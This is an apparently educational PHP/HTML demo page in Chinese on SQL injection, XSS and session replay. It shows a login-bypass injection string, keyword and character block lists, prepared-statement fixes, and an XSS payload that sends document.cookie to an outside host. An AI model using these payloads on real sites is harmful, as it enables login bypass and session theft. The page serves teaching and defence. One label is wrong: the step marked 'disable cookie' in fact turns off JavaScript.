<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>测试sql注入</title>
<link href="/google/prettify.css" type="text/css" rel="stylesheet" />
<script type="text/javascript" src="/google/prettify.js"></script>

</head>

<body style="text-align:left;padding-left:100px" onload="prettyPrint()">

<a href="http://robindemo.sdo.com/csss/index.html" target=blank>分享</a> 

<p style="font-size:50px">危害分布</p>
<img src="xss.jpg"/>
<p style="font-size:50px">sql注入</p>

<br/>
禁用cookie:     about:config->javascript.enabled false 
<br/>
 注入 robin' or '1'='1
<br/>

<pre class="prettyprint">
//特殊sql符号： 
String[] str=new String[]{"'", "<", ">", "%", "\"\"", ",", ".", ">=", "=<", "<>", "-", "_", ";", "||", "[", "]", "&", "/", "-", "|", " "}


//特殊sql关键字： 
select, update, insert, delete, declare, @, exec, dbcc, alter, drop, 
create, backup, if, else, end, and,   or, add, set, open, close, use, begin, retun, as, go, exists
</pre>
<pre class="prettyprint">
//参数化sql 查询

$query = sprintf("SELECT * FROM Users where UserName='%s' and Password='%s'", 
                  mysql_real_escape_string($Username), 
                  mysql_real_escape_string($Password));
mysql_query($query);
或是

$db = new mysqli("localhost", "user", "pass", "database");
$stmt = $mysqli -> prepare("SELECT priv FROM testUsers WHERE username=? AND password=?");
$stmt -> bind_param("ss", $user, $pass);
$stmt -> execute();
</pre>
</div>

<p style="font-size:50px">xss攻击：</p>
<br>
<?php  
$xss = "<script>document.createElement(\"img\").src=\"http://sdkbus.com?p\"+document.cookie</script>";
echo htmlentities($xss);
?>
<pre class="prettyprint">
特殊html标签： 
<?php  
$xss = "<applet>  <body>  <embed>  <frame>  <script>  <frameset>  <html>  <iframe>  <img>  <style>  <layer>  <link>  <ilayer>  <meta>  <object>";
echo htmlentities($xss);
?>
</pre>
</br>
<p style="font-size:50px">会话重放：</p>
<img src="cookie_mock.jpg"/>
</body>
<html>
